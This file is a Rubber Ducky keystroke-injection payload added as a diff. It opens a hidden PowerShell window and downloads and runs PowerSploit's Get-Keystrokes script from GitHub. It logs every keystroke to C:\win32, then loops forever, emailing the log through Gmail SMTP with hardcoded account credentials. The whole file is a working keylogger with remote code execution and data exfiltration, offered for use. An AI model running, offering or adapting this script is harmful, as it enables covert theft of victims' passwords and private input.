@@ -1,0 +1,44 @@
+DELAY 1000
+GUI r
+DELAY 800
+STRING powershell -WindowStyle hidden
+ENTER
+DELAY 1000
+STRING md C:\win32
+DELAY 400
+ENTER
+STRING cd C:\win32
+ENTER
+DELAY 2000
+STRING IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1')
+ENTER
+DELAY 9000
+STRING Get-Keystrokes -LogPath C:\win32\keystroke123.txt -Timeout 1
+ENTER
+DELAY 500
+STRING $SMTPServer = 'smtp.gmail.com'
+ENTER
+DELAY 100
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+DELAY 100
+STRING $SMTPInfo.EnableSsl = $true
+ENTER
+DELAY 100
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('logdem1234@gmail.com', 'keylogs987654321')
+ENTER
+DELAY 800
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+DELAY 100
+STRING $ReportEmail.From = 'logdem1234@gmail.com'
+ENTER
+DELAY 400
+STRING $ReportEmail.To.Add('logdem1234@gmail.com')
+ENTER
+DELAY 300
+STRING $ReportEmail.Subject = 'Keylogger - ' + [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
+ENTER 
+DELAY 800
+STRING while(1){$ReportEmail.Attachments.Add("C:\win32\keystroke123.txt");$SMTPInfo.Send($ReportEmail);sleep 60}
+ENTER
